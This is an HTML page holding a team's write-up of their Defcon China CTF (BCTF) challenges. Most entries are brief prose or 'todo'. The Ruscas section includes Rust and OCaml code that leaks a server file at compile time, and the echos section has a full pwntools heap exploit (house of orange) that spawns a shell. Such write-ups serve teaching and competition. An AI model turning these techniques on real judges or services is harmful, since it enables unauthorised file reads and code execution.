@@ -1,0 +1,444 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Defcon China CTF(BCTF)</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/r3kapig/CTF-challenge">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">r3kapig / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            <!-- toc2html-mobile -->
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=CTF-challenge&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=CTF-challenge&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          <!-- toc2html-desktop -->
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="defcon-china-ctf(bctf)"><a class="header-link" href="#defcon-china-ctf(bctf)"></a>Defcon China CTF(BCTF)</h1>
+<p>Happy Children&#39;s Day, hackers! I know you all hacked the time, so you may stay young forever, haha.</p>
+<p>Anyway, thanks for participating BCTF. It&#39;s a tough task to keep all the challenges as good as possible in such a short time. As we are not the only one writing challenges, here is the list of challenges that from our hands. Other challenges will not be covered in this writeup, as it&#39;s not our work. Really hope you guys enjoyed the challenges, and please do contact us if you have anything to complain about the challenges.</p>
+<p>Challenges from us include:</p>
+<p>trispl, ruscas, echos, myheart, snake, lut, lut revenge, speedapp1, speedapp2 and router.</p>
+<h2 id="trispl"><a class="header-link" href="#trispl"></a>trispl</h2>
+<p>Fast correlation attack based on LFSR sampling is investigated. The geffe generator is used to carry out fast correlation attacks, but all three LFSRs are sampled. Firstly, you need to do a fast correlation attack to establish the equation. Secondly, the sampling sequence is need to be reversed to the original sequence.The chaotic sequence established by fast correlation attack is related to the first and third sampling sequence respectively. All three LFSRs use primitive polynomials, which are not decomposable and can not use decomposition attack. After fast correlation attack, we use anti-sampling to find the initial state, which is flag.</p>
+<h2 id="ruscas"><a class="header-link" href="#ruscas"></a>Ruscas</h2>
+<pre class="hljs"><code><span class="hljs-comment">//! # Intro</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! Compile using `rustc -O`, report wrong if result is less than 0</span>
+<span class="hljs-comment">//! else all report normal.</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! Core idea is to using internal compiler bug to distinguish between</span>
+<span class="hljs-comment">//! true and false. </span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! # Key Points</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! There are multiple parts that I intended to test the players:</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! - "include_bytes!" macro that can get arbitrary file content at the</span>
+<span class="hljs-comment">//!   compile time</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! - const fn calculation, which the only distinguishable implemented</span>
+<span class="hljs-comment">//!   [arithmetic feature](https://github.com/rust-lang/rust/issues/53718) </span>
+<span class="hljs-comment">//!   is the "is_negative" and "is_positive" on integer type.</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! - use inline assembly bug to make it possible to be optimized away</span>
+<span class="hljs-comment">//!   without triggering. There's a lot of ICE (internal compiler error)</span>
+<span class="hljs-comment">//!   to trigger, however, not all of them is good enough to handle this</span>
+<span class="hljs-comment">//!   case. For example, the borrow checker bug will panic before the</span>
+<span class="hljs-comment">//!   dead code elimination happens, so it will panic wherever you put it.</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! # Intention</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! Original intention is to "attack the online judge services with Rust".</span>
+<span class="hljs-comment">//! This comes to me as I search throw `Rust` stdlib's documentation and</span>
+<span class="hljs-comment">//! find out "include_*" functions that work at compile time. Most online</span>
+<span class="hljs-comment">//! judge systems can tell you if you program successfully compiles, these</span>
+<span class="hljs-comment">//! functions may allow potential attacking to read arbitrary contents.</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! # Potential Problems</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! There might be potential unintended solutions possible.</span>
+<span class="hljs-comment">//! One that is already encountered and considered is that one can leverage</span>
+<span class="hljs-comment">//! the constant checker to get a different result when compiling.</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! For example, it is possible to make it not compilable given</span>
+<span class="hljs-comment">//! `(FLAG_BYTE as u32 - b'g' as u32) as i32` as if the FLAG_BYTE is `f`,</span>
+<span class="hljs-comment">//! this will cause an overflow in constant which will be prevented by compiler.</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! Since this case will only cause the compiler to fail instead of error,</span>
+<span class="hljs-comment">//! the return value is 1 instead of other minus values. So as a counter measure,</span>
+<span class="hljs-comment">//! I changed the return value check part to be "more than 0x7f (less than 0) or not".</span>
+<span class="hljs-comment">//!</span>
+<span class="hljs-comment">//! Still, I'm not 100 percent sure if there exists any other unintended solutions.</span>
+<span class="hljs-meta">#![feature(const_fn, asm)]</span>
+
+<span class="hljs-comment">/// This will get one byte out of flag, compare it with different bytes to get</span>
+<span class="hljs-comment">/// the whole flag</span>
+<span class="hljs-keyword">const</span> VALUE: <span class="hljs-keyword">i32</span> = (include_bytes!(<span class="hljs-string">"./flag"</span>)[<span class="hljs-number">0</span>] - <span class="hljs-string">b'g'</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">i32</span>;
+
+<span class="hljs-keyword">const</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">guess</span></span>() -&gt; <span class="hljs-keyword">bool</span> {
+    VALUE.is_negative() <span class="hljs-comment">// false</span>
+}
+
+<span class="hljs-keyword">extern</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">test</span></span>() {}
+
+<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() {
+    <span class="hljs-comment">// Use this difference to get to know flag</span>
+    <span class="hljs-keyword">if</span> guess() {
+        <span class="hljs-comment">// optimize away</span>
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-comment">// compiles</span>
+        <span class="hljs-keyword">unsafe</span> { asm!(<span class="hljs-string">"call $0"</span> :: <span class="hljs-string">"i"</span>(test) :: <span class="hljs-string">"intel"</span>); }
+    }
+}</code></pre><p>Complete solution (in Ocaml :P) using binary search:</p>
+<pre class="hljs"><code><span class="hljs-comment">(* usage: ocaml unix.cma str.cma exp.ml *)</span>
+<span class="hljs-keyword">open</span> <span class="hljs-type">Unix</span>
+
+<span class="hljs-keyword">let</span> connect_service addr port =
+    <span class="hljs-keyword">let</span> inet_addr = (gethostbyname addr).h_addr_list.(<span class="hljs-number">0</span>) <span class="hljs-keyword">in</span>
+    <span class="hljs-keyword">let</span> sockaddr = <span class="hljs-type">ADDR_INET</span> (inet_addr, port) <span class="hljs-keyword">in</span>
+    <span class="hljs-keyword">let</span> sock = socket <span class="hljs-type">PF_INET</span> <span class="hljs-type">SOCK_STREAM</span> <span class="hljs-number">0</span> <span class="hljs-keyword">in</span>
+    connect sock sockaddr;
+    <span class="hljs-keyword">let</span> outchan = out_channel_of_descr sock <span class="hljs-keyword">in</span>
+    <span class="hljs-keyword">let</span> inchan = in_channel_of_descr sock <span class="hljs-keyword">in</span>
+    (inchan, outchan)
+
+<span class="hljs-keyword">let</span> done_regexp = <span class="hljs-type">Str</span>.regexp <span class="hljs-string">"Done"</span>
+
+<span class="hljs-comment">(** generate exploit Rust code *)</span>
+<span class="hljs-keyword">let</span> gen_exploit_code index ch = 
+    <span class="hljs-type">Printf</span>.sprintf <span class="hljs-string">"#![feature(const_fn, asm)]
+
+const VALUE: i32 = (include_bytes!(\"/flag\")[%d] as i8 - b'\\x%02x' as i8) as i32;
+
+const fn guess() -&gt; bool {
+    VALUE.is_negative()
+}
+
+extern fn test() {}
+
+fn main() {
+    if guess() {
+    } else {
+        unsafe { asm!(\"call $0\" :: \"i\"(test) :: \"intel\"); }
+    }
+}
+EOF
+"</span> index ch
+
+<span class="hljs-comment">(**
+ * check if is less than character ch
+ *)</span>
+<span class="hljs-keyword">let</span> is_less index ch ~host ~port =
+    <span class="hljs-keyword">let</span> pass_hint inchan =
+        <span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">4</span> <span class="hljs-keyword">do</span>
+            input_line inchan |&gt; ignore;
+            <span class="hljs-keyword">done</span> <span class="hljs-keyword">in</span>
+    <span class="hljs-keyword">let</span> inchan, outchan =
+        connect_service host port <span class="hljs-keyword">in</span>
+    <span class="hljs-keyword">begin</span>
+        pass_hint inchan;
+        <span class="hljs-keyword">let</span> code = gen_exploit_code index ch <span class="hljs-keyword">in</span>
+        <span class="hljs-keyword">begin</span>
+            <span class="hljs-comment">(* print_endline ("sending: " ^ code); *)</span>
+            output_string outchan code;
+            flush outchan;
+            input_line inchan |&gt; ignore; <span class="hljs-comment">(* compiling... *)</span>
+            <span class="hljs-keyword">let</span> res = input_line inchan <span class="hljs-keyword">in</span>
+            <span class="hljs-keyword">begin</span>
+                print_endline res;
+            <span class="hljs-keyword">if</span> <span class="hljs-type">Str</span>.string_match done_regexp res <span class="hljs-number">0</span> <span class="hljs-keyword">then</span>
+                <span class="hljs-literal">true</span>
+            <span class="hljs-keyword">else</span>
+                <span class="hljs-literal">false</span>
+            <span class="hljs-keyword">end</span>
+        <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">end</span>
+
+
+<span class="hljs-comment">(**
+ * bruteforce particular index
+ *)</span>
+<span class="hljs-keyword">let</span> bruteforce index ~host ~port =
+    <span class="hljs-keyword">let</span> <span class="hljs-keyword">rec</span> binary_search_bruteforce index left right =
+        <span class="hljs-keyword">if</span> left &lt; right <span class="hljs-keyword">then</span>
+            <span class="hljs-keyword">begin</span>
+                print_endline (<span class="hljs-type">Printf</span>.sprintf <span class="hljs-string">"left: %d"</span> left);
+                print_endline (<span class="hljs-type">Printf</span>.sprintf <span class="hljs-string">"right: %d"</span> right);
+            <span class="hljs-keyword">let</span> mid = (left + right) / <span class="hljs-number">2</span> + <span class="hljs-number">1</span> <span class="hljs-keyword">in</span>
+            <span class="hljs-keyword">if</span> is_less index mid ~host ~port <span class="hljs-keyword">then</span>
+                binary_search_bruteforce index left (mid - <span class="hljs-number">1</span>)
+            <span class="hljs-keyword">else</span>
+                binary_search_bruteforce index mid right
+            <span class="hljs-keyword">end</span>
+        <span class="hljs-keyword">else</span>
+            right
+    <span class="hljs-keyword">in</span> binary_search_bruteforce index <span class="hljs-number">17</span> <span class="hljs-number">127</span>
+
+
+<span class="hljs-keyword">let</span> <span class="hljs-keyword">rec</span> getflag cur ~host ~port =
+    <span class="hljs-keyword">let</span> len = <span class="hljs-type">String</span>.length cur <span class="hljs-keyword">in</span>
+    <span class="hljs-keyword">begin</span>
+    <span class="hljs-keyword">if</span> len &lt; <span class="hljs-number">0x20</span> <span class="hljs-keyword">then</span>
+        bruteforce len ~host ~port |&gt;
+        <span class="hljs-type">Char</span>.chr |&gt;
+        <span class="hljs-type">String</span>.make <span class="hljs-number">1</span> |&gt;
+        <span class="hljs-keyword">fun</span> x -&gt; <span class="hljs-keyword">begin</span>
+            print_endline (<span class="hljs-string">"cur: "</span> ^ cur ^ x);
+            getflag (cur ^ x) ~host ~port
+        <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">else</span>
+        cur
+    <span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">let</span> <span class="hljs-literal">()</span> =
+    print_endline <span class="hljs-string">"start"</span>;
+    getflag <span class="hljs-string">""</span> ~host:<span class="hljs-string">"localhost"</span> ~port:<span class="hljs-number">50806</span> |&gt;
+        print_endline;
+;;</code></pre><h2 id="echos"><a class="header-link" href="#echos"></a>echos</h2>
+<h3 id="1.-program-info"><a class="header-link" href="#1.-program-info"></a>1. program info</h3>
+<p>this challenge is modified base the SUCTF 2018&#39;s noend challenge. The detail information of noend is in the Neo God&#39;s <a href="https://changochen.github.io/2018-05-28-suctf.html">blog</a>.</p>
+<p>In this chanllenge, I add the following code to prevent the noend&#39;s solution. </p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span>(s)
+{
+    int is_main_arena = (*(unsigned long long*)(s-<span class="hljs-number">8</span>))&amp;<span class="hljs-number">0</span>x4;
+    <span class="hljs-keyword">if</span>(is_main_arena != <span class="hljs-number">0</span>)
+    {
+        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);
+    }
+}</code></pre><h3 id="2.-bug"><a class="header-link" href="#2.-bug"></a>2. bug</h3>
+<p>The bug is still same with the noend. when malloc fail, it can cause arbitrary-address-wrrite-zeo.</p>
+<h3 id="3.-exploit"><a class="header-link" href="#3.-exploit"></a>3. exploit</h3>
+<p>The leak is easy, and I will skip that part.</p>
+<p>when call malloc, when the main_arean region is not enough, it will use mmap to map a region which is  close to the libc library address.</p>
+<p>So, we can modify some pointer of the libc library, and let the pointer point to the mmaped region.</p>
+<p>I use the <code>house of orange</code>, use arbitrary-address-wrrite-zeo to modify  <code>_IO_list_all</code> pointer the 2nd and 3rd byte to zero (for example modify <code>0x7ffff7dd2540</code> to <code>0x7ffff7000040</code>), at <code>0x7ffff7000040</code>, we can set a fake <code>struct _IO_FILE_plus</code> structure.</p>
+<p>the final script:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+context.terminal = [<span class="hljs-string">'guake'</span>, <span class="hljs-string">'-n'</span>, os.getcwd(), <span class="hljs-string">'-e'</span>]
+context.log_level = <span class="hljs-string">'debug'</span>
+pc=<span class="hljs-string">'./echos'</span>
+<span class="hljs-comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>
+libc = ELF(<span class="hljs-string">'./libc-2.23.so'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ru</span><span class="hljs-params">(a)</span>:</span>
+    p.recvuntil(a)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sa</span><span class="hljs-params">(a,b)</span>:</span>
+    p.sendafter(a,b)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sla</span><span class="hljs-params">(a,b)</span>:</span>
+    p.sendlineafter(a,b)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">echo</span><span class="hljs-params">(size,content)</span>:</span>
+    p.sendline(str(size))
+    sleep(<span class="hljs-number">1</span>)
+    p.send(content)
+    k=p.recvline()
+    <span class="hljs-keyword">return</span> k
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(n)</span>:</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-string">'0'</span>*n
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">house_of_orange</span><span class="hljs-params">(libc,libc_addr)</span>:</span>
+    _IO_str_jumps_addr = libc_addr + libc.symbols[<span class="hljs-string">'sys_sigabbrev'</span>] + <span class="hljs-number">0x1940</span>
+    payload = p64(<span class="hljs-number">0xfffffffffffffffe</span>) + p64(<span class="hljs-number">0x61</span>) + pad(<span class="hljs-number">8</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'_IO_list_all'</span>]<span class="hljs-number">-0x10</span>)
+    payload+= p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + pad(<span class="hljs-number">8</span>) + p64(libc_addr + libc.search(<span class="hljs-string">'/bin/sh'</span>).next())
+    payload+= pad(<span class="hljs-number">0x80</span>)
+    payload+= p64(<span class="hljs-number">0xffffffffffffffff</span>) + pad(<span class="hljs-number">0x10</span>) + p64(_IO_str_jumps_addr<span class="hljs-number">-0x8</span>)
+    payload+= pad(<span class="hljs-number">8</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'system'</span>])
+    <span class="hljs-keyword">return</span> payload
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hack</span><span class="hljs-params">()</span>:</span>
+    base = <span class="hljs-number">0x0000555555554000</span>
+    echo(<span class="hljs-number">0x38</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
+    echo(<span class="hljs-number">0x28</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
+    echo(<span class="hljs-number">0x48</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
+    echo(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
+    k=echo(<span class="hljs-number">0x28</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
+    leak_value =u64(k[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])
+    <span class="hljs-keyword">print</span> (hex(leak_value))
+    libc_base=leak_value<span class="hljs-number">-0x3c4b78</span>
+    <span class="hljs-keyword">print</span> <span class="hljs-string">'libc_base:'</span>, hex(libc_base)
+    size = libc_base&amp;<span class="hljs-number">0xfff000</span><span class="hljs-number">-0x1000</span>
+    io_list_all = libc.symbols[<span class="hljs-string">'_IO_list_all'</span>]+libc_base
+    <span class="hljs-keyword">print</span> <span class="hljs-string">'IO_list_all:'</span>, hex(io_list_all)
+    pading = ((io_list_all&amp;<span class="hljs-number">0xff</span>)+<span class="hljs-number">0x10</span>)*<span class="hljs-string">'a'</span>
+
+    <span class="hljs-keyword">if</span> (io_list_all&amp;<span class="hljs-number">0xffffffffff000000</span>) != (libc_base&amp;<span class="hljs-number">0xffffffffff000000</span>):
+        print(<span class="hljs-string">'fail, try again'</span>)
+        <span class="hljs-keyword">return</span>
+    echo(size, pading+house_of_orange(libc, libc_base))
+
+    <span class="hljs-keyword">if</span> size &lt; <span class="hljs-number">0x200000</span>:
+        echo(size, pading+house_of_orange(libc, libc_base))
+
+    echo(<span class="hljs-number">0x90</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
+    echo(<span class="hljs-number">0x28</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
+    echo(<span class="hljs-number">0x90</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
+    p.sendline(str(io_list_all+<span class="hljs-number">2</span>))
+    sleep(<span class="hljs-number">1</span>)
+    p.sendline(str(io_list_all+<span class="hljs-number">3</span>))
+    sleep(<span class="hljs-number">1</span>)
+    <span class="hljs-keyword">print</span> <span class="hljs-string">'io_list_all:'</span>, hex(io_list_all)
+
+    p.clean()
+    main_arena = libc_base + <span class="hljs-number">0x3c4b20</span>
+
+    p.sendline(str(main_arena+<span class="hljs-number">0x70</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment">#unsort bin</span>
+    sleep(<span class="hljs-number">1</span>)
+    p.sendline(str(main_arena+<span class="hljs-number">0x70</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment">#unsort bin</span>
+    p.interactive()
+
+p = process(pc)
+hack()
+</code></pre><h2 id="myheart"><a class="header-link" href="#myheart"></a>myheart</h2>
+<p>Firstly, you need to reverse the binary, and you can find this is a stream cipher. It&#39;s similar to toyocrypto, which can be attacked by the algebraic attack. There is an easy OOB-read vulnerability to leak the plaintext. You can xor the plaintext and the ciphertext to get the lfsr&#39;s output. From an option, you can get enough output to finish the algebraic attack. But it&#39;s important to note that, we modified the S10<em>S23</em>S32<em>S42 to S11</em>S22<em>S33</em>S53. So the new annihilation is needed.</p>
+<h2 id="snake"><a class="header-link" href="#snake"></a>Snake</h2>
+<p>This is a gameboy re challenge. We can get the gameboy rom from the browser when we access the game website. </p>
+<p>We can easily find out that this game is the classic Snake. How can we get the flag then? We have to reverse  engineer the game of course. Load it into ida32 and set the processor to z80 then we can see the assembly.</p>
+<p>From the code we can see that there is a variable controlling whether to display &quot;GAME OVER&quot; or &quot;FLAG IS&quot;.After locating where it is used, we can easily locate the memory that saves the flag and how it is generated. Play it and get the flag.</p>
+<p>You can check out many amazing resources about gameboy at <a href="https://github.com/gbdev/awesome-gbdev">https://github.com/gbdev/awesome-gbdev</a></p>
+<h2 id="lut"><a class="header-link" href="#lut"></a>lut</h2>
+<p>todo</p>
+<h2 id="lut-revenge"><a class="header-link" href="#lut-revenge"></a>lut revenge</h2>
+<p>todo</p>
+<h2 id="speedapp1"><a class="header-link" href="#speedapp1"></a>speedapp1</h2>
+<p>todo</p>
+<h2 id="speedapp2"><a class="header-link" href="#speedapp2"></a>speedapp2</h2>
+<p>Todo</p>
+<h2 id="router"><a class="header-link" href="#router"></a>router</h2>
+<p>And for the challenge &quot;router&quot;, for the reason that we all know, writeup and exploit will not be available.</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
